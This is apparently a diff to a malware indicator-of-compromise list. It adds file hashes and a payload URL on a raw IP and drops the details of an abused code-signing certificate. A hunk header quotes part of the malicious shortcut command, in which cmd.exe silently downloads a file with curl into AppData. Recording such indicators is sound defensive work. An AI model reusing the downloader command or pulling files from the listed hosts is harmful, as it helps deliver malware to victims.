@@ -2,23 +2,12 @@
 
 ******************************
 
-.html 
-.zip 
-.dll 
+.html b7e1654fda729818761dc3585d4daf68720858343a12fa8b4190fb38782aaae2
+.zip ff07cf7cd277d18f362ea682d038d1cf7a54262642eec6bcb475f3a4d33ba70f
+.dll 93f1d8a2990baf61d808646c19240d1077561f585a85ae47df4b39b3b4ca6740
 
 ******************************
 
-Code Signing Certificate
-Organisation:   Power Save Systems s.r.o.
-Issuer: Sectigo Public Code Signing CA R36
-Algorithm:  sha384WithRSAEncryption
-Valid from: 2022-03-15T00:00:00Z
-Valid to:   2023-03-15T23:59:59Z
-Serial number:   4728189fa0f57793484cdf764f5e283d
-Thumbprint Algorithm:   SHA256
-Thumbprint:  89ff94ac1c577eced3afc9a81689d30ca238a8472ad0f025f6bed57a98dbb273
-
-******************************
 
 lnk content:
 
@@ -36,6 +25,7 @@ cmd.exe" /c set r1=regs&&C:\Windows\system32\curl -s -o C:\Users\Admin\AppData\L
 ******************************
 
 http://194.36.189.211/whoThing.jpg
+http://216.238.109.24/thingAtThere.jpg
 
 *************************************************
 
